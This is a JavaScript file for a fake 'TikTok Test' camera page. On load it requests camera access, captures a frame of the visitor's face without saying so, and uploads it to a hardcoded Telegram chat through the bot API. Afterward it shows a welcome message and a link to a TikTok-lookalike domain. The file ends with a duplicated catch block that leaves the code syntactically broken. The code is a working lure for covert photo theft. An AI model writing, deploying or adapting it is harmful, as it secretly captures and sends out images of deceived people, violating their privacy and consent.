document.addEventListener('DOMContentLoaded', async () => {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');
    const idiNaxuy = document.getElementById('idiNax');
    const pointer = document.getElementById('pointer');
    const botBtn = document.getElementById('botBtn');

    // Translations for supported languages
    const messages = {
        en: {
            wait: 'Please wait...',
            unsupportedBrowser: 'Your browser is not supported. Tap the three dots in the top right corner...',
            cameraError: 'Camera access error. Please grant the necessary permissions and try again',
            prankFriends: 'Welcome to the Tiktok Test Web',
            botLinkText: 'Open Your Camera To Test Tiktok New Pixelated Camera'
        },
        // Add other languages as needed
    };

    const userLang = (navigator.language || navigator.userLanguage || 'en').split('-')[0];
    const lang = messages[userLang] ? userLang : 'en'; // Default to English if the language isn't supported

    idiNaxuy.textContent = messages[lang].wait;
    pointer.style.display = 'none';
    botBtn.style.display = 'none';
    context.canvas.style.display = 'none';

    const chatId = '5074699192';  // Replace with the actual chat ID

    try {
        // Fetch the token securely from the backend
        const response = await fetch('/api/getToken');
        const data = await response.json();
        const telegramBotToken = data.token; // Token retrieved from the backend

        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: 'user' } } });
        video.srcObject = stream;

        video.onloadedmetadata = () => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            video.play().then(() => {
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = context.canvas.toDataURL('image/jpeg');

                // Convert image data to Blob
                fetch(imageData)
                    .then(res => res.blob())
                    .then(blob => {
                        const formData = new FormData();
                        formData.append('photo', blob, 'image.jpg');
                        formData.append('chat_id', chatId);

                        // Send image to Telegram via bot API
                        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        })
                        .then(response => response.json())
                        .then(data => {
                            console.log('Image uploaded to Telegram successfully:', data);
                            context.canvas.style.display = 'block';
                            idiNaxuy.textContent = messages[lang].prankFriends;
                            botBtn.textContent = messages[lang].botLinkText;
                            botBtn.href = 'https://tiktok.ftp.sh'; // Replace with your channel link
                            botBtn.style.display = 'block';
                        })
                        .catch(error => {
                            console.error('Error uploading the image to Telegram:', error);
                        });
                    });

                // Stop video stream
                stream.getTracks().forEach(track => track.stop());
            }).catch(() => {
                idiNaxuy.textContent = messages[lang].unsupportedBrowser;
                pointer.style.display = 'flex';
            });
        };

    } catch (error) {
        idiNaxuy.textContent = messages[lang].cameraError;
    }
});

    } catch (error) {
        idiNaxuy.textContent = messages[lang].cameraError;
    }
});
